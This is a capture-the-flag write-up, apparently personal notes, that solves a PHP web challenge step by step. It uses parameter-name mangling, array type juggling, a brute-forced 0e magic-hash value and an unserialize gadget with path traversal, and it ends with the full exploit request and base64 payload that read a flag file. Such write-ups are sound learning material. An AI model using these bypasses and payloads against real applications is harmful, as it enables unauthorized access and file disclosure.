![[Screenshot 2026-10-16 at 22.24.15.png]]
```php
if (isset($_GET['manual'])) {
    $manual = $_GET['manual'];

    if (!is_string($manual)) {
        fail_request('Invalid manual name');
    }

    if (str_contains($manual, 'php://') || str_contains($manual, '..p')) {
        fail_request('Invalid manual name');
    }

    $manual = rawurldecode($manual);

    if (!str_ends_with($manual, '.php')) {
        fail_request('Only PHP manual pages can be loaded');
    }

    page_start('Operations manual');
    include $manual;
    page_end();
    exit;
}
```
At the start page, we can pass a `manual` parameter to get a file from server, but it used some conditions to protect(cannot use `php://` scheme, file extension must be `.php`). I tried some tricks like insert null byte or path traversall, yet it's not working.
So i change to another target, scroll down file. We see steps to meet for gateway verifying administrator access.
First,
```php
$rawQuery = $_SERVER['QUERY_STRING'] ?? '';

if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}
```
[[https://github.com/symfony/symfony/issues/9009]]
in PHP, we can use `.` instead of `_`, so i just need to add `&access.level=administrator` to bypass this shield.
Second,
```php
$primary = $_GET['primary'] ?? null;
$backup = $_GET['backup'] ?? null;

if ($primary === null || $backup === null) {
    fail_request('Both recovery answers are required');
}

if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}

if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}

$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial = 'legacy-recovery:v1:' . $backup;

$primaryHash = hash('sha256', $primaryMaterial);
$backupHash = hash('sha256', $backupMaterial);

if (!hash_equals($primaryHash, $backupHash)) {
    fail_request('Recovery fingerprints do not match');
}
```
this maybe too tricked. To bypass this, we need to find 2 different value with the sam data type and these has the same hash value. [in `sha256` it too rare to have collision](https://crypto.stackexchange.com/questions/47809/why-havent-any-sha-256-collisions-been-found-yet).
https://www.php.net/manual/en/language.variables.external.php
From this docs, we can realize that in this code, we can pass any data type. What about array ?
`GET /?access.level=administrator&primary[]=&backup[]=0`
when we pass these parameter:
```php
$_GET = 
[
	'primary' => [0 => ''],
	'backup'  => [0 => '0'],
]
```
we can test:
```php
$GET = 
[
	'primary' => [0 => ''],
	'backup'  => [0 => '0'],
];
$primary = $GET['primary'];
$backup = $GET['backup'];
if ($primary === $backup) {
    echo "failed";
}
else echo "bypassed" . "\n";
echo $primary . "\n" . $backup;
/*
Output:
bypassed
Array
Array
*/
```
`$primary` and `$backup` at initially are associative array so they are not equal. Then using `echo` to print, these variables need to convert to string so it's value is `Array`(following the parse mechanism in php), so they are equal. It's also equivalent to add string in original code. Hmmm, so we have the same value so we have the same hash. It bypassed!!!
Third,
```php
$code = $_GET['code'] ?? '';

if (!is_string($code) || strlen($code) > 64) {
    fail_request('Invalid migration code');
}

$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);

if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', [
        'legacy' => $legacyDigest,
        'modern' => $modernDigest,
    ]);
}
```
Brief, we need to find a code that `hash md5` and `hash sha256` of it is strictly different(`!==`), and also equall(`==`)???
we need to distinguish some comparison operators in php [[https://www.php.net/manual/en/language.operators.comparison.php]]
`!==`: is not equal or not same type
`==`: is equal
[[https://www.php.net/manual/en/types.comparisons.php]]
From this docs, we can see that, 0 == "0". But in this case, two variables are string...
[[https://medium.com/@huzefa0x01/authentication-bypass-via-php-loose-comparison-exploiting-type-juggling-in-a-password-reset-flow-32cf196b6ce0]]
Brief, if an `md5 hash` or a string starts with `0e` followed by only digits, PHP interprets it as `0 * 10^n`, which evaluates to `0.0` as a float. So it was converted to number. The bypass way is that find a code that have the `md5 hash` and `sha256` starts with `0e` followed by only digits. 
i write a simple script to find it:
```python
import hashlib

def check2(s: str):
  s = s[2::]
  try:
    int(s)
    return True
  except Exception:
    return False
    
  

def check(s: str):
    s = 'ULTIMATIVE-PHP-2026:' + s
    md5 = hashlib.md5(s.encode()).hexdigest()[0:9]
    if not md5.startswith("0e"):
        return False
    sha = hashlib.sha256(s.encode()).hexdigest()[0:9]
    if not sha.startswith("0e"):
        return False
    return check2(md5) and check2(sha)

code = 0
while not check(str(code)):
    code += 1
print(code)
#output: 59036305
```
`GET /?access.level=administrator&primary[]=&backup[]=0&code=59036305`

The last step,
```php
final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}

final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }

        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);

        return $contents === false ? '[missing template]' : $contents;
    }
}
```
...
```php
$encodedProfile = $_GET['profile'] ?? '';

if (!is_string($encodedProfile)) {
    fail_request('Invalid profile encoding');
}

$serializedProfile = decode_base64url($encodedProfile);

if ($serializedProfile === false) {
    fail_request('Invalid profile encoding');
}

$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}

page_start('Migration completed');
echo '<section class="result"><p class="eyebrow">Verification complete</p>';
echo '<h2>Profile imported</h2><p class="lead">Welcome to the modern identity platform.</p>';
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
echo '</section>';
page_end();
```
Brief, we need to pass a `profile` parameter decoded by base64. and the profile is the string of [serialization](https://www.php.net/manual/en/function.serialize.php)(Serializtion is a way to convert a object to string for tranfering). The server will deserialize this but it must be `MigratedProfile` class (it have 2 conditions), then print it.
The `LegacyTemplate` allow to get files from the server. We can traverse path to get `/tmp/flag`(find it in dockerfile)
```php
if (strpos($this->template, '../')) {
	return '[invalid template]';
} // strpos() return the index of the needle
```
we just need to put the `../` at the start of `$template` to bypass.
```php
if(0) --> false
```
But the type of `$profile` must be `MigratedProfile`, so i will put the `flag` to the `name` of this class, then it will be showed.
```php
<?php
final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}

final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }

        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);

        return $contents === false ? '[missing template]' : $contents;
    }
}

$data = new LegacyTemplate();
$data->template = "../../../../../../../../../../../../../../tmp/flag";
$data->__toString();
$flag = new MigratedProfile();
$flag->displayName = $data;
echo serialize($flag);
/*
Output:
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:50:"../../../../../../../../../../../../../../tmp/flag";}}
*/
?>
```
then encode base 64 the `$profile`.
`GET /?access.level=administrator&primary[]=&backup[]=0&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6NTA6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ==`

![[Pasted image 20261017000451.png]]